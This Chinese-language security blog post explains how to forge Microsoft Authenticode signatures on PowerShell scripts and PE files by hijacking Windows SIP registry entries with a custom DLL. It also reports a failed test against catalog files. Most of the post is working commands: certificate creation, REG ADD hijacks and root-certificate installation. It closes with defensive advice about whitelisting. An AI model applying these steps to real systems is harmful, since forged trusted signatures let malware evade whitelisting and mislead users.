---
layout: post
title: Authenticode签名伪造——针对文件类型的签名伪造
---

## 0x00 前言
---

在上篇文章[《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》](https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/)介绍了针对单一文件的Authenticode签名伪造，需要在文件尾部添加伪造的签名数据，这次将介绍另一种签名伪造方式：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。

**注：**

本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。

**参考资料：**

https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf

http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html

https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view

## 0x01 简介
---

本文将要介绍以下内容：

- 针对powershell脚本的签名伪造方法
- 针对PE文件的签名伪造方法
- 针对其他类型文件的签名伪造方法
- 添加代码实现对特定文件的签名伪造

## 0x02 针对powershell脚本的签名伪造方法
---

前提是powershell脚本需要包含一个签名(自己生成的签名会被识别为无效)，下面介绍如何将该无效签名伪造成有效的微软签名

生成测试证书：

```
makecert -n "CN=Microsoft Windows Test1" -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cer
cert2spc certtest.cer certtest.spc
pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
```

不需要注册该证书

**注：**

使用makecert.exe要加参数： `-eku 1.3.6.1.5.5.7.3.3`

否则提示证书无法用于代码签名，具体错误如下：

`Set-AuthenticodeSignature : Cannot sign code. The specified certificate is not
suitable for code signing.`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-1.png)

给powershell脚本签名：

```
$cert = Get-PfxCertificate certtest.pfx
Set-AuthenticodeSignature -Filepath 1.ps1 -Cert $cert
```

验证证书：

```
Get-AuthenticodeSignature .\1.ps1
```

提示`UnknownError`，表示文件签名无效

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-2.png)

修改注册表，命令如下：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
```

再次验证：

```
Get-AuthenticodeSignature .\1.ps1
```

显示`Valid`，签名有效

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-3.png)

**注：**

不同系统下相同名称的文件签名不同

`AFDD80C4EBF2F61D3943F18BB566D6AA6F6E5033`为Matt Graeber测试系统中的notepad.exe签名hash


现在在我们自己的系统进行测试：`Win10 x64`

分别获取notepad.exe的签名信息：

```
Get-AuthenticodeSignature c:\windows\system32\notepad.exe
```

```
sigcheck -i C:\Windows\System32\notepad.exe
```

可以发现sigcheck的输出内容中，`Thumbprint`对应文件签名hash，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-1.png)

接下来，将测试系统改为`Win7 x86`

在Win7下使用`Get-AuthenticodeSignature`无法获得notepad.exe的签名信息(catalog签名)

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-2.png)

但可以通过sigcheck获得，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-3.png)

hash为：`018B222E21FBB2952304D04D1D87F736ED46DEA4`

定位cat文件路径：`C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntexe.cat`

.cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下： 

https://lapo.it/asn1js/

选择cat文件后即可解密显示完整格式

格式解析可参考：

https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography

将该文件替换PoCSubjectInterfacePackage工程中的`MS_cert.bin`，重新编译

配置注册表

打开一个新的cmd，查看powershell脚本签名：

```
Get-AuthenticodeSignature .\1.ps1
```

同sighcheck获取的hash值保持一致，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-4.png)

powershell脚本的Authenticode签名伪造成功

对以上操作直观的理解：

**该方法是通过修改系统证书验证过程，使文件将指定的catalog签名作为自己的Authenticode签名**

当然，所有带签名的powershell脚本均会统一成hash为`018B222E21FBB2952304D04D1D87F736ED46DEA4`的签名，这就带来了一个问题：**这样会影响正常系统文件的签名校验**


我们可以看到，通过这种方式伪造的签名会作用于所有powershell脚本，那么，我们能否针对特定powershell脚本作伪造呢？

以Matt Graeber开源的工程PoCSubjectInterfacePackage作为模板进行修改，下载地址如下：

https://github.com/mattifestation/PoCSubjectInterfacePackage

重点关注函数`GetLegitMSSignature`，在线地址：

https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138

查看结构`SIP_SUBJECTINFO *pSubjectInfo`的参数说明，地址如下：

https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx

`pwsFileName`和`pwsDisplayName`均能够表示文件名称，所以可通过`MessageBox`进行验证

函数`GetLegitMSSignature`内添加如下代码：

```
MessageBox (NULL, pSubjectInfo->pwsFileName, pSubjectInfo->pwsDisplayName,0);  
```

进行测试，成功获得传入文件名，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-1.png)

接下来的思路：

对传入的文件名称进行判断，满足条件的文件加载对应的catalog签名，最终实现对特定文件的签名伪造

筛选文件的代码如下：

```
if(lstrcmpi((LPCTSTR)pSubjectInfo->pwsFileName,L"C:\\test\\cer\\1.ps1")==0)
{
	MessageBox (NULL,L"Get selected file", (LPCTSTR)pSubjectInfo->pwsFileName,0) ;   
}
```

完整代码可参考：

https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c

当前文件为`C:\test\cer\1.ps1`时，符合条件，进行签名伪造，否则放弃

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-2.png)

成功实现对特定文件的签名伪造，这种方式的优点是不需要在文件尾部添加Authenticode签名，不改变文件hash

当然，这仅仅是一个POC，还要对系统文件的签名验证做判断

## 0x03 针对PE文件的签名伪造方法
---

参考这个列表：

- C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE
- DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.cat文件
- 9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件
- C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件

如果替换exe文件的校验，即`CryptSIPDllVerifyIndirectData`和`CryptSIPDllGetSignedDataMsg`，命令如下：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
```

重启explorer.exe，所有的exe文件都包含hash为：`018B222E21FBB2952304D04D1D87F736ED46DEA4`的签名

特别的地方：**伪造的签名来自于cat文件，但是会以Authenticode签名的格式显示，通过文件属性能够看到签名信息(这是Authenticode签名的特性，catalog签名不具有该特性)**

同样，修改原工程能够实现针对特定PE文件的签名伪造，方法不再赘述

## 0x04 针对cat文件的签名伪造方法
---

如果对所有.cat文件的签名验证过程进行替换，再将其添加到安全编录数据库中，那么，包含catalog签名的PE文件是否也随即获得伪造签名呢？

下面开始测试：

新建文本文档cat.txt，内容如下：

```
[CatalogHeader]
Name=makecat1.cat
[CatalogFiles]
<hash>ExeFile1=mimikatz.exe

```

**注：**

txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到

使用makecat.exe生成makecat1.cat：

```
makecat -v cat.txt
```

为makecat1.cat添加伪造的Authenticode签名：

```
signtool sign /f certtest.pfx /p 123456 makecat1.cat
```

**注：**

certtest.pfx不能使用之前手动生成的证书，不能加参数： `-eku 1.3.6.1.5.5.7.3.3`，否则exe文件的catalog签名将会校验失败

生成certtest.pfx的操作如下：

```
makecert -n "CN=Microsoft Windows Test1" -r -sv certtest.pvk certtest.cer
cert2spc certtest.cer certtest.spc
pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
```

此处还需要将证书安装到“受信任的根证书颁发机构”存储区

管理员权限：

```
certmgr.exe -add -c certtest.cer -s -r localmachine root
```

否则，之后的签名验证会报错，提示证书链不可信

**补充：**

从“受信任的根证书颁发机构”存储区删除证书的操作为：

(管理员权限)

```
certmgr.exe -del -c -n "Windows Test1" -s -r localMachine Root
```

cat文件对应GUID:`DE351A43-8E59-11D0-8C47-00C04FC295EE`

替换注册表键值：

```
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
```

重启explorer.exe，所有的cat文件签名均为`Microsoft Windows`

将makecat1.cat添加到系统的安全编录数据库：

(管理员权限)

```
signtool catdb -v makecat1.cat
```

最终，发现文件的catalog签名保持不变，无法进行伪造

得出结论： **这种方式无法对catalog签名进行伪造**

## 0x05 小结
---

本文介绍了Authenticode签名伪造的另一种利用方法：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。

经过这两篇文章的测试，得出最终结论：应谨慎对待系统的Authenticode签名，因为通过修改注册表或dll劫持等方式均能够伪造出微软签名，对此，白名单等防御机制不应盲目相信Authenticode签名过的文件。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

